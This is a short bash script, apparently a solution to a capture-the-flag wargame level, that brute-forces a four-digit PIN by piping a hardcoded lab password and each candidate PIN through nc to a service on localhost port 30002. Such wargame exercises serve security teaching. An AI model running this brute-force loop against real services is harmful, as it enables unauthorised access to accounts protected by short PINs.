# Date              : 23.04.2019
# Last Modified Date: 23.04.2019

password=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

pin=0000

for pincode in {1220..9999};
do
    result="$(echo $password $pincode | timeout 1s nc localhost 30002);"
    if ! [[ "$result" =~ "Wrong" ]]; then
        echo $pincode
        echo $result
        break
    fi
done
    
